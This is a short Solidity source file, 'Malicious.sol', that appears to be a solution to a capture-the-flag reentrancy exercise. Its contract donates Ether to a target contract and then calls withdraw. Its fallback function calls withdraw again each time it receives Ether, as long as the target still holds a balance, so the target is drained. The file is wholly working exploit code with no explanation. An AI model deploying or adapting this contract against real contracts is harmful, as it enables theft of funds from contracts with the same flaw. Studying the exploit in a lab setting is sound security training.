// Malicious.sol
pragma solidity ^0.4.18;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract Malicious {
    IReentrance public target;

    function Malicious(address _target) public {
        target = IReentrance(_target);
    }

    function attack() public payable {
        target.donate.value(msg.value)(this);
        target.withdraw(msg.value);
    }

    // Fallback function to be called by the Reentrance contract
    function () public payable {
        if (target.balance > 0) {
            target.withdraw(msg.value);
        }
    }
}